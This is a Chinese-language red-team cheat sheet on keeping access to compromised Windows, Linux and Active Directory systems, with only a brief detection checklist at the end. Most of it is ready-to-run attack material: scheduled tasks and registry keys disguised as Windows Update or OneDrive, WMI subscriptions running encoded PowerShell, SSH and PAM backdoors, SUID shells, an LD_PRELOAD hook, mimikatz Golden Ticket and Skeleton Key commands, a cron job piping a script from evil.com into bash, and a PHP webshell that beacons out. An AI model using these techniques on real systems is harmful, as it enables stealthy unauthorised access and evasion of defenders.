# 权限维持（Windows / Linux）全攻略

---

## 📋 目录

1. [权限维持概述](#一权限维持概述)
2. [Windows 持久化](#二windows-持久化)
3. [Linux 持久化](#三linux-持久化)
4. [域环境持久化](#四域环境持久化)
5. [WebShell 后门持久化](#五webshell-后门)
6. [检测与防御](#六检测与防御)

---

## 一、权限维持概述

```
权限维持 (Persistence) = 获得初始权限后，
在被发现/清除/重启后仍能保持访问

持久化三要素：
  ✓ 隐蔽性 — 不被EDR/运维发现
  ✓ 可靠性 — 重启后依然有效
  ✓ 冗余性 — 多个持久化机制互为备份
```

---

## 二、Windows 持久化

### 2.1 计划任务

```powershell
# === 方法1: 创建隐藏计划任务 ===
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\svchost.exe" /sc daily /st 09:00 /ru SYSTEM /f

# === 方法2: 高频触发 ===
schtasks /create /tn "SystemCompatibility" /tr "powershell -enc <B64_PAYLOAD>" /sc minute /mo 5 /ru SYSTEM /f
# → 每5分钟执行一次

# === 方法3: 登录触发 ===
schtasks /create /tn "UserLogonTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM /f

# 查看/清理:
schtasks /query /tn "WindowsUpdate" 
schtasks /delete /tn "WindowsUpdate" /f
```

### 2.2 注册表自启动

```powershell
# HKCU 自启动（当前用户权限，更隐蔽）
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
    /v "OneDrive" /t REG_SZ /d "C:\Users\Public\onedrive.exe" /f

# HKLM 自启动（需要管理员权限）
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run \
    /v "SecurityHealth" /t REG_SZ /d "C:\Windows\Temp\sechealth.exe" /f

# 其他注册表自启动位置:
# HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
# HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```

### 2.3 服务持久化

```powershell
# 创建Windows服务
sc create "WindowsUpdateService" binPath= "C:\Windows\Temp\update.exe" start= auto
sc description "WindowsUpdateService" "Windows Update Background Service"
sc start "WindowsUpdateService"
```

### 2.4 WMI 事件订阅

```powershell
# WMI永久事件 — 最难检测的持久化

# 每5分钟触发：
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "UptimeFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "UptimeConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -enc <BASE64>"
}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

# 清除：
Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
```

### 2.5 快捷方式劫持

```powershell
# 修改桌面/开始菜单的常用快捷方式
$shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("C:\Users\Public\Desktop\Chrome.lnk")
$shortcut.TargetPath = "C:\Windows\Temp\evil.exe"
# 先启动恶意程序
$shortcut.Arguments = '&& start chrome.exe'
$shortcut.Save()
```

---

## 三、Linux 持久化

### 3.1 SSH 后门

```bash
# === 方法1: SSH 公钥 ===
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# === 方法2: SSH PAM 后门 ===
# 修改 /etc/pam.d/sshd 添加万能密码
# (任何密码 + 后门密码 都能登录)

# === 方法3: 修改 sshd 配置允许 root 登录 ===
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config

# === 方法4: SSH 软连接后门 ===
# 配合端口敲门
ln -sf /usr/sbin/sshd /tmp/.ssh
/tmp/.ssh -oPort=44444
# → 在44444端口启动SSH(绕过防火墙规则)
```

### 3.2 Crontab 持久化

```bash
# 当前用户
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update.sh") | crontab -

# /etc/crontab
echo "*/10 * * * * root /usr/share/.backup.sh" >> /etc/crontab

# cron.d
echo "*/5 * * * * root curl -s http://evil.com/beacon.sh | bash" > /etc/cron.d/security-check

# 隐藏cron方法: 文件名以.开头
echo "*/5 * * * * root /tmp/.cache/update" > /etc/cron.d/.system-update
```

### 3.3 Systemd 服务

```bash
# 创建 systemd 服务
cat > /etc/systemd/system/systemd-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/share/.updated
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable systemd-update.service
systemctl start systemd-update.service
```

### 3.4 .bashrc / .profile

```bash
# 用户登录时执行
echo 'nohup /tmp/.beacon &>/dev/null &' >> ~/.bashrc
echo '/tmp/.beacon &' >> ~/.profile

# 全局
echo 'alias sudo="sudo /tmp/.beacon;sudo"' >> ~/.bashrc
# → 每次执行sudo → 先运行后门
```

### 3.5 SUID 后门

```bash
# 创建SUID shell
cp /bin/bash /tmp/.bash_suid
chmod +s /tmp/.bash_suid
# → /tmp/.bash_suid -p → root权限

# 或给系统程序加SUID
chmod +s /usr/bin/find
# → find . -exec /bin/bash -p \;
```

### 3.6 LD_PRELOAD 后门

```c
// backdoor.c — 劫持 accept() 函数
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdlib.h>

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
    static int (*real_accept)(int, struct sockaddr*, socklen_t*) = NULL;
    if (!real_accept) real_accept = dlsym(RTLD_NEXT, "accept");
    
    // 这里可以执行后门逻辑（如反向shell）
    return real_accept(sockfd, addr, addrlen);
}
```

```bash
gcc -shared -fPIC backdoor.c -o /tmp/libaccept.so -ldl

# /etc/ld.so.preload
echo "/tmp/libaccept.so" >> /etc/ld.so.preload
# → 所有新进程加载此库
```

---

## 四、域环境持久化

```bash
# === Golden Ticket ===
mimikatz "kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:<HASH> /user:Administrator /id:500 /ticket:golden.kirbi"
# → 即使修改密码也有效

# === Skeleton Key ===
mimikatz "privilege::debug" "misc::skeleton"
# → DC的LSASS被注入 → "mimikatz"作为万能密码

# === AdminSDHolder ===
# 修改AdminSDHolder的ACL → 每60分钟自动传播到所有受保护组

# === DCShadow ===
# 自注册为伪DC → 在AD中创建/修改对象

# === DSRM ===
ntdsutil "set dsrm password" → 修改目录服务恢复模式密码
# → 物理访问DC时可登录
```

---

## 五、WebShell 后门

```php
// PHP 免杀后门

// 1. 会话保持（每隔一段时间执行一次）
ignore_user_abort(true);
set_time_limit(0);
while (true) {
    @file_get_contents('http://evil.com/beacon?host=' . gethostname());
    sleep(300);  // 每5分钟
}

// 2. 图片伪装（图片末尾嵌入PHP）
// 正常显示的图片，但访问 ?cmd=whoami 执行命令

// 3. 内存马（不落地WebShell）
// 注入到PHP-FPM进程内存中

// 4. .htaccess 隐藏后门
// 将正常PHP文件路由到后门
php_value auto_prepend_file "/var/www/html/.hidden/backdoor.php"
```

---

## 六、检测与防御

```
检测思路：
  ✦ 审计新增计划任务/服务/注册表项
  ✦ 监控 /etc/crontab, ~/.ssh/authorized_keys
  ✦ 定期检查 LD_PRELOAD, /etc/ld.so.preload
  ✦ 使用 Tripwire/AIDE 做文件完整性监控
  ✦ EDR 监控进程链和注册表变更

防御：
  ✦ 最小权限原则
  ✦ 应用程序白名单
  ✦ 审计日志不可篡改
  ✦ 定期安全巡检
```

---

## ✅ Checklist

- [ ] 计划任务/Scheduled Tasks
- [ ] 注册表自启动(Run/RunOnce)
- [ ] Windows 服务
- [ ] WMI 事件订阅
- [ ] SSH authorized_keys
- [ ] Crontab 计划任务
- [ ] Systemd 服务
- [ ] .bashrc/.profile 修改
- [ ] SUID 后门
- [ ] 域环境持久化(Golden Ticket等)
- [ ] WebShell 后门
